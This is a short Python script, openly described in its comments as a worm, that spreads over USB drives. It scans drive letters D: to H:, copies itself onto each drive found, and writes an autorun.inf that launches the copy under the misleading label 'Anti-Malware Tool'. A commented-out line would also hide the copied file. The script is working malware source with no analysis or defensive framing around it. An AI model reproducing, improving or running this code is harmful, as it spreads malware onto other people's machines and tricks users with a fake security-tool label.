import os, sys, subprocess

wormdir, worm = os.path.split(sys.argv[0])

USBPos = ['D:\\', 'E:\\', 'F:\\', 'G:\\', 'H:\\']
USBDir = []

lencount = len(USBPos)
lencount -= 1

#adding availale USBs to list
def scanUSBs(lencount):
    while lencount >= 0 :
        if os.path.exists(USBPos[lencount]):
            USBDir.append(USBPos[lencount])
            lencount -= 1
            
        else:
            lencount -= 1
            continue
    anyUSBs()

#checking if USB list is empty
def anyUSBs():
    if USBDir == []:
        print "No USBs detected at this time!!"
        print "Exiting...\n"
        sys.exit(1)

    else:
        print ""
        copyWorm()


#copying bkd into USB and hiding it
def copyWorm():
    USBCount = len(USBDir)
    USBCount -= 1
    while USBCount >= 0 :
        fulldir = os.path.join(USBDir[USBCount], worm)
        subprocess.call('copy ' + worm + " " + fulldir, shell=True)
        #subprocess.call('attrib +s +h +r' + fulldir, shell=True)
        USBCount -=1
    autoRun()


#adding autorun file to usb to automatically execute worm
def autoRun():
    USBCount = len(USBDir)
    USBCount -= 1
    while USBCount >= 0 :
        fullname = os.path.join(USBDir[USBCount] , 'autorun.inf')
        try:
            if os.name=='nt':
                fp = open(fullname, 'w+')
                auto1 = '[autorun]'
                auto2 = 'open = ' + worm
                auto3 = 'action = Anti-Malware Tool'
                fp.write(auto1)
                fp.write('\n')
                fp.write(auto2)
                fp.write('\n')
                fp.write(auto3)
                fp.close()
                USBCount -=1

            else:
                break

        except IOError:
            USBCount -=1

    sys.exit(2)

scanUSBs(lencount)
